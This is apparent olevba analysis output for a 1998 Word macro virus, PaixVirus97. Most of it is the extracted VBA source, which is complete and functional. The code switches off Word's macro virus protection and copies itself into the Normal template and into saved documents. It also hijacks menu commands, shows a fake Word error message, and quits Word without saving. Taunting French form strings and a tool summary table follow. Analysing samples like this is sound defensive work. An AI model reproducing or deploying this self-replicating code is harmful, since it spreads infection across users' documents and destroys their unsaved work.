olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PaixVirus97.bas 
in file: Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f - OLE stream: 'Macros/VBA/PaixVirus97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate, MyWeek, N$
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
Randomize
N$ = Int(Rnd * 7) + 1
If MyWeek = N$ Then
    MsgBox "C'est le jour J pour moi...", vbInformation, "PaixVirus97"
    Call PaixV97Pay
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
iMacroCount = WordBasic.CountMacros(0, 0)
On Error GoTo ErrorAO
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "PaixVirus97" Then
        PaixVirus97Installed = -1
    End If
Next i
If Not PaixVirus97Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PaixVirus97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PaixMsg1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PaixMsg2", Object:=wdOrganizerObjectProjectItems
    MsgBox "La PAIX soit avec vous..." & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "PaixVirus97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PaixVirus97", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PaixMsg1", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PaixMsg2", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    PaixMsg1.Show
    ActiveWindow.Caption = "PaixVirus97 est lа !!!!"
ErrorFT:
End Sub
Private Sub PaixV97Pay()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPV97P
For t = 1 To 10
ActiveWindow.Caption = "Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                        Je veux avoir la paix!!!!!, merci "
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
Next t
Application.Quit SaveChanges:=wdDoNotSaveChanges
ErrorPV97P:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    PaixMsg2.Show
    ActiveWindow.Caption = "PaixVirus97 est lа !!!!"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PaixMsg1.frm 
in file: Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f - OLE stream: 'Macros/VBA/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Unload PaixMsg1
End Sub
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO PaixMsg2.frm 
in file: Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f - OLE stream: 'Macros/VBA/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Unload PaixMsg2
End Sub
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Le virus PaixVirus97 vous a infect�...I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98 vous souhaite la paix �ternelle!!!60�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J'esp�re que cel� ne vous emb�tera pas...rne&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HAHAHAHAHA!!!!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1998 � par ZeMacroKiller98H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cliquer ici
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pourquoi ne voulez-pas la PAIX ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce n'est pas tr�s intelligent de votre part.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Le calme y a que �a de vrai...H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Allez, je suis sympa, je reste avec vous!!!.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� car vous ne pourrez pas m'�liminer!!!!!S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JE VIENS EN PAIX!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Merci!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.PaixVirus-40f48400c270323dbac7490cf566a8a1b12bd52f' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

